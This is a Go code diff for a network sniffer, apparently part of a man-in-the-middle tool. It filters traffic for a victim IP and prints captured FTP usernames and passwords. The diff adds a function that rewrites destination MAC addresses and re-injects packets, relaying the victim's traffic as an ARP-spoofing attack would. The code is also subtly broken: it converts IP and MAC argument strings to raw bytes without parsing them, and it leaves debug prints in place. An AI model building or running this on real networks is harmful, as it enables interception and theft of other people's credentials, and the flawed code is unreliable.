@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"log"
 	"strings"
+	"bytes"
 	"errors"
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
@@ -38,10 +39,10 @@ func selectInterface() (pcap.Interface, error) {
 }
 
 func parseCaughtPacket(packet gopacket.Packet) {
+	fmt.Println("ping")
 	transportLayer := packet.Layer(layers.LayerTypeTCP)
 	/* filter ipv6 packets */
 
-	/*testPrintPacket(packet)*/
 	if transportLayer != nil {
 		tcp, _ := transportLayer.(*layers.TCP)
 		appLayer := packet.ApplicationLayer()
@@ -51,55 +52,38 @@ func parseCaughtPacket(packet gopacket.Packet) {
 			
 			switch payload[0] {
 			case "USER":
-				fmt.Printf("[USER] Caught credentials: username %s\n", payload[1])
+				fmt.Printf("[USER] Caught credentials: username %s", payload[1])
 			case "PASS":
-				fmt.Printf("[PASS] Caught credentials: passwd %s\n", payload[1])
+				fmt.Printf("[PASS] Caught credentials: password %s", payload[1])
 			case "RETR":
-				fmt.Printf("Client <--- Server: %s\n", payload[1])
+				fmt.Printf("Client <--- Server: %s", payload[1])
 			case "STOR":
-				fmt.Printf("Client ---> Server: %s\n", payload[1])
+				fmt.Printf("Client ---> Server: %s", payload[1])
 			default:
 				break
 			}
 		}
 	}
-
-	/*
-        **     ~~ TO TEST WITH ARP SPOOFER ~~
-	**    test if needed to inject captured packets
-	**    into network with fixed ethernet frame
-	*/
-
-	/* func (p *Handle) WritePacketData(data []byte) (err error) */
 }
 
-func testPrintPacket(packet gopacket.Packet) {
-	ethLay := packet.Layer(layers.LayerTypeEthernet)
-	if ethLay != nil {
-		fmt.Println(" ~~ ETH layer ~~")
-		eth, _ := ethLay.(*layers.Ethernet)
-		fmt.Printf("src: %s, dst: %s\n", eth.SrcMAC, eth.DstMAC)
+func tunnelPacket(packet gopacket.Packet, victimIP, victimMAC, serverMAC []byte) []byte {
+	var dstMAC []byte;
+	
+	ipLayer := packet.Layer(layers.LayerTypeIPv4)
+	ip, _ := ipLayer.(*layers.IPv4)
+
+	if bytes.Compare(ip.SrcIP, victimIP) == 0 {
+		dstMAC = serverMAC
+	} else {
+		dstMAC = victimMAC
 	}
-	ipLay := packet.Layer(layers.LayerTypeIPv4)
-	if ipLay != nil {
-		fmt.Println(" ~~ IP layer ~~")
-		ip, _ := ipLay.(*layers.IPv4)
-		fmt.Printf("src: %s, dst: %s\n", ip.SrcIP, ip.DstIP)
-	}
-	tcpLay := packet.Layer(layers.LayerTypeTCP)
-	if tcpLay != nil {
-		fmt.Println(" ~~ TCP layer ~~")
-		tcp, _ := tcpLay.(*layers.TCP)
-		fmt.Printf("src: %d, dst: %d\n", tcp.SrcPort, tcp.DstPort)
-	}
-	appLay := packet.ApplicationLayer()
-	if appLay != nil {
-		fmt.Println(" ~~ App. layer ~~")
-		fmt.Printf("%s\n", appLay.Payload())
-	}
+	oldPacket := packet.Data()
+	newPacket := append(dstMAC[:], oldPacket[6:]...)
+	
+	return newPacket
 }
 
-func usage() {
+func usage() { /* delete when done */
 	fmt.Fprintf(os.Stderr, "usage: %s [victim-IP] [victim-MAC] [server-MAC]\n", os.Args[0])
 	os.Exit(1)
 }
@@ -109,7 +93,7 @@ func main() /*Sniffer*/ {
 	if len(os.Args[1:]) != 3 {
 		usage()
 	}
-	var filter string = "tcp and host " + os.Args[1]
+	var filter string = "host " + os.Args[1]
 	iface, err := selectInterface()
 	if err != nil {
 		log.Fatal(err)
@@ -126,9 +110,13 @@ func main() /*Sniffer*/ {
 		log.Fatal(err)
 	}
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-	/* open log file */
+	
 	fmt.Println("[ MONITORING NETWORK ]")
 	for packet := range packetSource.Packets() {
 		parseCaughtPacket(packet)
+		err := handle.WritePacketData(tunnelPacket(packet, []byte(os.Args[1]), []byte(os.Args[2]), []byte(os.Args[3])))
+		if err != nil {
+			fmt.Println("[DEBUG] could not tunnel packet")
+		}
 	}
 }
